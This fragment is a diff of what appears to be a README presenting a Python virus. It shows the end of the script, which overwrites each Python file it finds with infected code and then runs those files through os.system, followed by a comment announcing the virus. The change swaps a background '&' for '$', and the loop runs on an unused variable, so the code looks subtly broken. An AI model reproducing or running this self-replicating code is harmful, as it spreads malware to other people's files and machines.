@@ -40,7 +40,7 @@ for file in python_files:
         with open(file, 'w') as f:
             f.writelines(final_code)
 for i in python_files:
-  os.system(f'python3 {os.path.abspath(file)} &')
+  os.system(f'python3 {os.path.abspath(file)} $')
 # VIRUS SAYS BYE!
 ```
 ### License
